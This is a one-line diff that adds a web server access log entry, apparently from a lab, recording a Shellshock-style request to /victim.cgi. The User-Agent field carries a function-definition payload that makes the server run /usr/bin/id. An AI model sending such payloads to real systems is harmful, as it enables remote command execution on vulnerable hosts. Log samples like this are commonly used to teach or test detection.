@@ -1,0 +1,1 @@
+192.168.60.1 - - [07/Jun/2026:22:03:14 +0000] "GET /victim.cgi HTTP/1.1" 200 187 "-" "() { :;}; echo Content-Type: text/html; echo; /usr/bin/id"
